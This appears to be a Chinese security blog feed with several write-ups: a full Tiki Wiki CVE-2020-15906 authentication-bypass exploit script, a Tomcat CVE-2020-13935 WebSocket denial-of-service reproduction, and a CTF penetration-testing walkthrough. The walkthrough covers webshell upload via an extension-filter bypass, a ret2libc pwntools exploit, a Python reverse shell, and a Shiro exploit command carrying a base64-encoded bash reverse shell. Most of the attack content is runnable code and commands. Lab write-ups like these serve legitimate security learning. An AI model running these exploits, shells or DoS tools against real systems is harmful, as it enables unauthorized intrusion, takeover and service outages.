Wiki 21</span><br></pre></td></tr></table></figure><p><img src="/../image/CVE-2020-15906/3.png" alt="3"></p><p>将 poc 复制到本地</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m 48927.py</span><br></pre></td></tr></table></figure><p><img src="/../image/CVE-2020-15906/4.png" alt="4"></p><p>48927.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: Tiki Wiki CMS Groupware 21.1 - Authentication Bypass</span></span><br><span class="line"><span class="comment"># Date: 01.08.2020 (1st August 2020)</span></span><br><span class="line"><span class="comment"># Exploit Author: Maximilian Barz aka. Silky</span></span><br><span class="line"><span class="comment"># Vendor Homepage: tiki.org</span></span><br><span class="line"><span class="comment"># Software Link: https://jztkft.dl.sourceforge.net/project/tikiwiki/Tiki_21.x_UY_Scuti/21.1/tiki-21.1.zip</span></span><br><span class="line"><span class="comment"># Version: 21.1</span></span><br><span class="line"><span class="comment"># Tested on: Kali Linux 5.7.0-kali1-amd64</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env/python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> lxml.html</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">banner = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">████████ ██ ██   ██ ██ ██     ██ ██ ██   ██ ██     ██████   ██    ██ </span></span><br><span class="line"><span class="string">   ██    ██ ██  ██  ██ ██     ██ ██ ██  ██  ██          ██ ███   ███ </span></span><br><span class="line"><span class="string">   ██    ██ █████   ██ ██  █  ██ ██ █████   ██      █████   ██    ██ </span></span><br><span class="line"><span class="string">   ██    ██ ██  ██  ██ ██ ███ ██ ██ ██  ██  ██     ██       ██    ██ </span></span><br><span class="line"><span class="string">   ██    ██ ██   ██ ██  ███ ███  ██ ██   ██ ██     ███████  ██ ██ ██ </span></span><br><span class="line"><span class="string">                                                                     </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> █████  ██    ██ ████████ ██   ██ ███████ ███    ██ ████████ ██  ██████  █████  ████████ ██  ██████  ███    ██         ██████  ██    ██ ██████   █████  ███████ ███████ </span></span><br><span class="line"><span class="string">██   ██ ██    ██    ██    ██   ██ ██      ████   ██    ██    ██ ██      ██   ██    ██    ██ ██    ██ ████   ██         ██   ██  ██  ██  ██   ██ ██   ██ ██      ██      </span></span><br><span class="line"><span class="string">███████ ██    ██    ██    ███████ █████   ██ ██  ██    ██    ██ ██      ███████    ██    ██ ██    ██ ██ ██  ██         ██████    ████   ██████  ███████ ███████ ███████ </span></span><br><span class="line"><span class="string">██   ██ ██    ██    ██    ██   ██ ██      ██  ██ ██    ██    ██ ██      ██   ██    ██    ██ ██    ██ ██  ██ ██         ██   ██    ██    ██      ██   ██      ██      ██ </span></span><br><span class="line"><span class="string">██   ██  ██████     ██    ██   ██ ███████ ██   ████    ██    ██  ██████ ██   ██    ██    ██  ██████  ██   ████         ██████     ██    ██      ██   ██ ███████ ███████ </span></span><br><span class="line"><span class="string">                                                                                                                                                                        </span></span><br><span class="line"><span class="string">Poof of Concept for CVE-2020-15906 by Maximilian Barz, Twitter: S1lky_1337</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>):</span><br><span class="line">        <span class="built_in">print</span>(banner)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: %s &lt;host&gt; &quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Eg:    %s 1.2.3.4 &quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    rhost = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="comment">#url = &quot;http://&quot;+rhost+&quot;/tiki/tiki-login.php&quot;</span></span><br><span class="line">    url = <span class="string">&quot;http://&quot;</span>+rhost+<span class="string">&quot;/tiki-login_scr.php&quot;</span></span><br><span class="line"></span><br><span class="line">    session = requests.Session()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_ticket</span>():</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        login_page = r.text.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        html = lxml.html.fromstring(login_page)</span><br><span class="line">        auth = html.xpath(<span class="string">&#x27;//input[@name=&quot;ticket&quot;]/@value&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(auth)[<span class="number">2</span>:-<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_cookie</span>():</span><br><span class="line">        session.get(url)</span><br><span class="line">        <span class="keyword">return</span> session.cookies.get_dict()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    cookie = get_cookie()</span><br><span class="line">    ticket = get_ticket()</span><br><span class="line"></span><br><span class="line">    payload = &#123;<span class="string">&#x27;ticket&#x27;</span>: ticket,<span class="string">&#x27;user&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;pass&#x27;</span>:<span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;login&#x27;</span>:<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;stay_in_ssl_mode_present&#x27;</span>:<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;stay_in_ssl_mode&#x27;</span>:<span class="string">&#x27;n&#x27;</span>&#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: rhost,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-US,en;q=0.5&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzrhost, deflate&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://&quot;+rhost+&quot;/tiki-login_scr.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;125&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;max-age=0&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>):</span><br><span class="line">        r = session.post(url, payload, headers)</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;Account requires administrator approval.&quot;</span> <span class="keyword">in</span> r.text):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Admin Password got removed.&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Use BurpSuite to login into admin without a password &quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(__name__ == <span class="string">&#x27;__main__&#x27;</span>):</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>对这个脚本我们要进行一些修改，将 45 修改为 46 行样子，73 行同理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 </span><br></pre></td></tr></table></figure><p>利用 github 上的脚本 ， 地址是 <code>https://srcincite.io/pocs/cve-2021-26119.py.txt</code></p><p>该 POC 先使用 CVE-2020-15906 绕过认证，获取管理员权限；再使用 Smarty 的沙盒绕过漏洞（CVE-2021-26119）于后台执行任意命令</p><p><img src="/../image/CVE-2020-15906/6.png" alt="6"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;tikiwiki&quot;&gt;&lt;a href=&quot;#tikiwiki&quot; class=&quot;headerlink&quot; title=&quot;tikiwiki&quot;&gt;&lt;/a&gt;tikiwiki&lt;/h1&gt;&lt;h2 id=&quot;CVE-2020-15906&quot;&gt;&lt;a href=&quot;#CVE-2020-15906&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CVE-2020-13935</title>
    <link href="https://s1ient.github.io/post/c1f78d69.html"/>
    <id>https://s1ient.github.io/post/c1f78d69.html</id>
    <published>2023-03-23T10:49:07.000Z</published>
    <updated>2023-05-10T05:57:59.643Z</updated>
    
    <content type="html"><![CDATA[<h1 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h1><h2 id="CVE-2020-13935-Tomcat-拒绝服务"><a href="#CVE-2020-13935-Tomcat-拒绝服务" class="headerlink" title="CVE-2020-13935 Tomcat 拒绝服务"></a>CVE-2020-13935 Tomcat 拒绝服务</h2><h3 id="漏洞介绍："><a href="#漏洞介绍：" class="headerlink" title="漏洞介绍："></a>漏洞介绍：</h3><p>Apache Tomcat 中的 WebSocket 存在安全漏洞，该漏洞源于Tomcat 未针对 WebSokcet 进行包长度校验，特制的 WebSocket 请求包将导致处理函数无限循环，最终导致服务停机并拒绝服务。</p><p>攻击者可利用该漏洞造成拒绝服务（无限循环）。</p><h3 id="漏洞影响范围："><a href="#漏洞影响范围：" class="headerlink" title="漏洞影响范围："></a>漏洞影响范围：</h3><blockquote><p>Apache Tomcat 10.0.0-M1-10.0.0-M6</p><p>Apache Tomcat 9.0.0.M1-9.0.36</p><p>Apache Tomcat 8.5.0-8.5.56</p><p>Apache Tomcat 7.0.27-7.0.104</p></blockquote><h3 id="漏洞复现环境："><a href="#漏洞复现环境：" class="headerlink" title="漏洞复现环境："></a>漏洞复现环境：</h3><blockquote><p>vulhub&#x2F;tomcat&#x2F;CVE-2020-1938</p><p>tomcat9.30</p><p>go</p><p>kali</p></blockquote><p>**利用POC： **</p><blockquote><p>tcdoc.exe</p><p><a href="https://github.com/RedTeamPentesting/CVE-2020-13935">https://github.com/RedTeamPentesting/CVE-2020-13935</a></p></blockquote><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="下载-go"><a href="#下载-go" class="headerlink" title="下载 go"></a>下载 go</h4><p>复现这个漏洞需要用到 <code>go</code> 环境，但是 kali 不自带</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 wget 下载安装包</span></span><br><span class="line">wget -c https://go.dev/dl/go1.20.2.linux-amd64.tar.gz</span><br><span class="line"><span class="comment"># 解压到 /usr/local目录下</span></span><br><span class="line">tar -C /usr/local -xzf go1.20.2.linux-amd64.tar.gz</span><br><span class="line"><span class="comment"># vim 打开文件 .profile</span></span><br><span class="line">vim ~/.profile</span><br></pre></td></tr></table></figure><p>进入 vim 后按<code> i</code> 进行插入，在最有一行添加<code>export PATH=$PATH:/usr/local/go/bin</code></p><p>接着按下 <code>Esc</code>，输入 <code>:wq</code>回车退出 vim</p><p><img src="/./../image/CVE-2020-13935/1.png" alt="1"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  使环境变量立即生效</span></span><br><span class="line"><span class="built_in">source</span> ~/.profile</span><br><span class="line"><span class="comment"># 查看版本，检查是否安装成功</span></span><br><span class="line">go version</span><br></pre></td></tr></table></figure><h4 id="开启-docker"><a href="#开启-docker" class="headerlink" title="开启 docker"></a>开启 docker</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入目录</span></span><br><span class="line"><span class="built_in">cd</span> /root/vulhub/tomcat/CVE-2020-1938 </span><br><span class="line"><span class="comment"># 对靶场进行编译</span></span><br><span class="line">docker-compose build</span><br><span class="line"><span class="comment"># 运行靶场</span></span><br><span class="line">docker-compose up -d</span><br><span class="line"><span class="comment"># 查看运行的端口</span></span><br><span class="line">docker-compose ps -a</span><br></pre></td></tr></table></figure><p>访问靶场，后面添加 <code>/examples/websocket/echo.xhtml</code>出现以下界面说明漏洞可以利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.6.128:8080/examples/websocket/echo.xhtml</span><br></pre></td></tr></table></figure><p><img src="/./../image/CVE-2020-13935/2.png" alt="2"></p><h4 id="下载-poc-并使用"><a href="#下载-poc-并使用" class="headerlink" title="下载 poc 并使用"></a>下载 poc 并使用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/RedTeamPentesting/CVE-2020-13935</span><br><span class="line"><span class="built_in">cd</span> CVE-2020-13935</span><br><span class="line"><span class="built_in">source</span> ~/.profile</span><br><span class="line"><span class="comment"># 安装说明步骤进行编译会报错，这里需要修改proxy地址</span></span><br><span class="line">go <span class="built_in">env</span> -w GOPROXY=https://goproxy.cn</span><br><span class="line">go build</span><br></pre></td></tr></table></figure><p><img src="/./../image/vulhub/3.png" alt="3"></p><p>我们先用<code>top</code>看一下 cpu 利用率，可以看到现在很低</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">top</span><br></pre></td></tr></table></figure><p><img src="/./../image/CVE-2020-13935/4.png" alt="4"></p><p>进行攻击，cpu 瞬间拉满</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tcdos ws://192.168.6.128:8080/examples/websocket/echoStreamAnnotation</span><br></pre></td></tr></table></figure><p><img src="/./../image/CVE-2020-13935/5.png" alt="5"></p><p>dos 成功</p><p>关闭靶场</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose down</span><br></pre></td></tr></table></figure><h3 id="漏洞解析"><a href="#漏洞解析" class="headerlink" title="漏洞解析"></a>漏洞解析</h3><p><a href="https://blog.redteam-pentesting.de/2020/websocket-vulnerability-tomcat/">https://blog.redteam-pentesting.de/2020/websocket-vulnerability-tomcat/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;tomcat&quot;&gt;&lt;a href=&quot;#tomcat&quot; class=&quot;headerlink&quot; title=&quot;tomcat&quot;&gt;&lt;/a&gt;tomcat&lt;/h1&gt;&lt;h2 id=&quot;CVE-2020-13935-Tomcat-拒绝服务&quot;&gt;&lt;a href=&quot;#CVE-2020-13</summary>
      
    
    
    
    
    <category term="-CVE-2020-13935 -vulhub -tomcat" scheme="https://s1ient.github.io/tags/CVE-2020-13935-vulhub-tomcat/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试1</title>
    <link href="https://s1ient.github.io/post/d43981de.html"/>
    <id>https://s1ient.github.io/post/d43981de.html</id>
    <published>2023-03-19T11:39:11.000Z</published>
    <updated>2023-05-10T05:57:59.655Z</updated>
    
    <content type="html"><![CDATA[<p>一共 11 题</p><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/1.png" alt="1"></p><h1 id="场景一"><a href="#场景一" class="headerlink" title="场景一"></a>场景一</h1><p>进去是一个类似于教程的界面，随便点点没有信息</p><p>照例 F12，找到 flag</p><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/2.png" alt="2"></p><h1 id="场景二"><a href="#场景二" class="headerlink" title="场景二"></a>场景二</h1><p>根据上一题的提示，我们访问 &#x2F;admin</p><p>得到一个登陆界面</p><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/3.png" alt="3"></p><p>使用 bp 爆破密码，运气好，第一个就得到了</p><p>用户名和密码都是 admin</p><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/4.png" alt="4"></p><p>进入后台，一番查找在 基本配置–七牛配置  中找到 flag</p><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/5.png" alt="5"></p><h1 id="场景三"><a href="#场景三" class="headerlink" title="场景三"></a>场景三</h1><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/6.png" alt="6"></p><p>上一题提示 &#x2F;home，但是没有 &#x2F;home 这个站点</p><p>题目本身也给了提示：数据库被篡改。猜测是被 getshell 了</p><p>然后找到了一个 文件上传 的点，下面添加一个上传后缀 php,记得要先提交</p><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/7.png" alt="7"></p><p>用 哥斯拉 生成一句话木马</p><p>但是上传 php 的时候提示后缀为空，看来后台对 php 进行了一个替换</p><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/8.png" alt="8"></p><p>所以我们对 php 进行双写，修改为 <code>pphphp</code>，上传成功</p><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/9.png" alt="9"></p><p>哥斯拉连接，在 home 目录下找到 ctf，里面就有 flag</p><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/10.png" alt="10"></p><h1 id="场景四"><a href="#场景四" class="headerlink" title="场景四"></a>场景四</h1><p>根据上一题提示，我们大概率是要找到 mysql 的账号和密码</p><p>在 <code>/var/www/html/app/database.php</code> 找到 用户和密码，都是 root</p><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/11.png" alt="11"></p><p>但是当我尝试连接的时候却发现 mysql 服务未开启</p><p>所以我在 哥斯拉 的终端里面将 mysql 里面的数据导出来，这里猜测字段名字是 flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -u root -p root flag &gt; 1.txt</span><br><span class="line"><span class="built_in">cat</span> 1.txt</span><br></pre></td></tr></table></figure><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/12.png" alt="12"></p><h1 id="场景五"><a href="#场景五" class="headerlink" title="场景五"></a>场景五</h1><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/13.png" alt="13"></p><p>上一题提示 nc 和 root</p><p>本来先 nc 扫描一下开放的端口，但是神奇的是我 nc 不仅扫不出来，而且扫完后我还无法访问靶场了……</p><p>看了眼 wp，他是 nmap 扫的，得到了端口 <code>9999</code></p><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/14.png" alt="14"></p><p>我重新开了一次环境（心疼），换了蚁剑连接，在 home 目录下找到了他说的 main 文件</p><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/15.png" alt="15"></p><p>将文件下载下来，file 查看 32 位 pwn，ida 查看</p><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/16.png" alt="16"></p><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/17.png" alt="17"></p><p>read 这里存在栈溢出，题目没给 system 和后门地址，需要我们 <code>ret2libc</code></p><p>这里用 <code>ROPgadger</code>看一下 pop esi;edi;ebp;ret</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary=main | grep <span class="string">&#x27;pop&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/18.png" alt="18"></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *  </span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span>    </span><br><span class="line">r = remote(<span class="string">&#x27;47.103.74.70&#x27;</span>,<span class="number">9999</span>)    </span><br><span class="line">elf = ELF(<span class="string">&#x27;./main&#x27;</span>)    </span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]    </span><br><span class="line"><span class="built_in">print</span>(write_got)    </span><br><span class="line">ppp_ret = <span class="number">0x08048559</span>    </span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x24</span> + <span class="number">4</span>) + p32(write_plt) + p32(ppp_ret) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">8</span>) + p32(main_addr)    </span><br><span class="line">r.sendlineafter(<span class="string">&#x27;plz input your name:\n&#x27;</span>,payload)    </span><br><span class="line">write_addr = u32(r.recv(<span class="number">4</span>))  </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))  </span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>) </span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)  </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system_addr),<span class="built_in">hex</span>(binsh_addr))    </span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">40</span> +p32(system_addr) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> + p32(binsh_addr)    </span><br><span class="line">r.sendlineafter(<span class="string">&#x27;plz input your name:\n&#x27;</span>,payload)   </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>运行后选择第 3 个</p><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/19.png" alt="19"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /root/flag</span><br></pre></td></tr></table></figure><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/20.png" alt="20"></p><h1 id="场景六"><a href="#场景六" class="headerlink" title="场景六"></a>场景六</h1><p>上一题给出提示 8080 端口，因此我们待会对 8080 端口进行渗透</p><p>对 8080 端口进行目录扫描，有一个 <code>robots.txt</code>，访问得到 flag</p><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/21.png" alt="21"></p><h1 id="场景七"><a href="#场景七" class="headerlink" title="场景七"></a>场景七</h1><p>其实上一题还得到了一个 <code>login</code> 路径，访问是一个登录界面</p><p>结合上一题提示，大概是找 RCE 了</p><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/22.png" alt="22"></p><p>界面处有一个 <code>remember me</code> 可以去试试 <code>shiro</code> 的漏洞了</p><p>先拦包看看回显发现有 <code>delete me</code></p><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/23.png" alt="23"></p><p>存在漏洞，这里我们直接用工具</p><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/24.png" alt="24"></p><p>命令执行处 ,根据上一题提示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> /home</span><br><span class="line"><span class="built_in">cat</span> /home/flag</span><br></pre></td></tr></table></figure><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/25.png" alt="25"></p><h1 id="场景八"><a href="#场景八" class="headerlink" title="场景八"></a>场景八</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#使用工具执行命令</span><br><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.12.6&quot;,2518));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br><span class="line">#nc接收</span><br><span class="line">nc -lvp 4568</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exploit.py -t 3 -u http://47.103.41.9:8080/ -p &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjYuMTI4LzI1MTggMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;一共 11 题&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/1.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;场景一&quot;&gt;&lt;a href=&quot;#场景一&quot; class=&quot;headerlin</summary>
      
    
    
    
    
